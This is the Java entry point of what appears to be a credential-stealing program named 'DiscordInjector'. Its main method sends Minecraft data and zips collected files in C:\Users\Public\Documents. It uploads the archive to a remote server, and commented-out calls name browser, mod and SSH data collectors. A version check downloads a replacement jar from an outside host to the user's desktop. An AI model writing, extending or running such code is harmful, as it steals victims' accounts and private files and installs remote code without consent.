package io.github.luxotick;

import io.github.luxotick.impl.*;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

import java.io.*;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.util.Objects;
import java.util.Scanner;
import java.net.URL;
import javax.swing.JOptionPane;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class Start {
    public static long snowflakeId = Snowflake.generateSnowflakeId();

    public static void main(String[] argument) throws Exception {
        String version = "1.0.2";
		versionChecker(version);
        Sender.sendMessage("Starting DiscordInjector v" + version);
		if (DiscordInjector.instance == null){
			DiscordInjector.instance = new DiscordInjector();
		}
	    //DiscordInjector.instance.initialize();
        /*
        Sender.sendMessage("DiscordInjector initialized.");
		Sender.sendMessage("Starting other arguments...");
		Browsers.main(argument);
		Sender.sendMessage("Browsers done.");
		Mods.main(argument);
		Sender.sendMessage("Mods done.");
		Ssh.main(argument);
		Sender.sendMessage("Ssh done.");
		Sender.sendMessage("Now launching the client.");
		*/
        Minecraft.sendMinecraft();
        OkHttpClient client = new OkHttpClient();

        File folder = new File("C:\\Users\\Public\\Documents");
        File[] listOfFiles = folder.listFiles();

        for (int i = 0; i < listOfFiles.length; i++) {
            if (listOfFiles[i].isFile()) {
                boolean contain = containsSnowflakeId(listOfFiles[i].getName());
                if(contain){
                    System.out.println("File " + listOfFiles[i].getName() + " contains snowflake id.");
                    snowflakeId = Long.parseLong(listOfFiles[i].getName().replace(".zip", ""));
                }else{
                    System.out.println("File " + listOfFiles[i].getName() + " does not contain snowflake id.");
                }

            }
        }

            Zip.main(argument);

        final String zort = "C:\\Users\\Public\\Documents\\" + snowflakeId +  ".zip";

        File asd = new File(zort);

        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", asd.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), asd))
                .build();

        Sender.Sender(client, requestBody);

        Sender.sendToServer(zort);

        System.exit(0);
	}


    public static boolean containsSnowflakeId(String filename) {
        String regex = "\\b[0-9]{19}\\b";
        Pattern pattern = Pattern.compile(regex);
        String hm = filename.replace(".zip", "");
        Matcher matcher = pattern.matcher(hm);
        System.out.println(pattern.pattern());
        if (matcher.find()) {
            System.out.println("Found snowflake id: " + matcher.group());
            return true;
        } else {
            System.out.println("No snowflake id found.");
            return false;
        }
    }
    public static void versionChecker(String version) throws IOException {
		// read raw data from url
		Scanner scanner = new Scanner(new URL("https://gist.githubusercontent.com/Luxotick/2290b71380bb4a68081632f56e3c9efa/raw/2238f8815902234acad57f3d70e2198db86f1524/gistfile1.txt").openStream());
		// read first line
		String line = scanner.nextLine();

        System.out.println("Current version: " + line);
		// close scanner
		scanner.close();

        if (!Objects.equals(line, version)) {
            JOptionPane.showMessageDialog(null, "You are using an outdated version. Please update to the latest version.", "Update available", JOptionPane.WARNING_MESSAGE);
            System.out.println("You are using an outdated version. Please update to the latest version.");
            update("https://dont-try.me/allah.jar", System.getProperty("user.home") + "/Desktop/" + "latest.jar");
            JOptionPane.showMessageDialog(null, "New version can be found on your desktop.", "Update done", JOptionPane.INFORMATION_MESSAGE);
            System.exit(0);

        } else {
            System.out.println("You are using the latest version.");
        }
    }

    private static void update(String urlStr, String file) throws IOException {
        URL url = new URL(urlStr);
        ReadableByteChannel rbc = Channels.newChannel(url.openStream());
        FileOutputStream fos = new FileOutputStream(file);
        fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
        fos.close();
        rbc.close();
    }
}